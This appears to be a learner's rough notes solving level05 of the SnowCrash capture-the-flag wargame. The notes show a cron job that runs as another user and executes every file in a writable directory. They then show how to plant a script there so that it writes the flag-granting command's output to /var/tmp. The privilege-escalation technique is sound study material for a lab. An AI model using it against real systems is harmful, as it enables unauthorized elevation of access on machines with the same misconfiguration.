#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done




 cd /rofs/var/spool/mail
level05@SnowCrash:/rofs/var/spool/mail$ ls
level05
level05@SnowCrash:/rofs/var/spool/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

this is cron - tool that run some script at a specified frequency.
*/2 = every 2 minutes


ls -l | grep arena
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
getfacl:
# file: openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---



find / -writable
touch my_file somewhere /var/tmp/my_file

create file in /opt/openarenaserver/
vim test 
echo $(getflag) > /var/tmp/my_file

get flag in /var/tmp/my_file